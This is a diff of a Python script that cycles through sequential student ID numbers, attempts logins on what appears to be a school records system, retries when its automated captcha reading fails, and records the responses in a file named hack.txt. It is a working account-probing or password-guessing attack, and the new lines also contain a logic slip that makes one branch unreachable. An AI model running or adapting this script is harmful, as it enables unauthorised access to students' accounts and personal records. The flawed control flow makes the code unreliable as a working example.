@@ -50,7 +50,9 @@ def creatfile(data, filename):
     string = "".join(data)  # 把list类型转换成str类型
     with open(filename, 'w') as f:
         f.write(string)
-#        print("创建文件成功")
+
+
+# print("创建文件成功")
 
 
 def scissor(imgpath):
@@ -244,16 +246,24 @@ def login(username):
 
 
 """"""
-           
 
 for x in range(3):
-    username = 1700117+x
+    username = 1600816 + x
     hack = login(str(username))
-    if(hack!='密码错误 登陆失败'):
-        if(hack=='该学生档案已转入存档,不能登录本系统!'):
+    if (hack != '密码错误 登陆失败'):
+        hack = '验证码识别出错'
+        if (hack == '该学生档案已转入存档,不能登录本系统!'):
             with open('hack.txt', 'a') as f:
-                f.write(str(username)+hack+'\n')
+                f.write( '\n'+str(username) + hack + '\n')
+        elif(hack == '验证码识别出错'):
+            while(hack == '验证码识别出错'):
+                hack = login(str(username))
+                print(str(username) +'验证码识别出错,已重试'+ '\n')
+                print('\n'+str(username) + hack + '\n')
+                with open('hack.txt', 'a') as f:
+                    f.write('\n' + str(username) + '验证码识别出错,已重试' + '\n')
+                    f.write('\n'+str(username) + hack + '\n')
         else:
             print(hack)
-            with open('hack.txt','a') as f:
+            with open('hack.txt', 'a') as f:
                 f.write(hack)
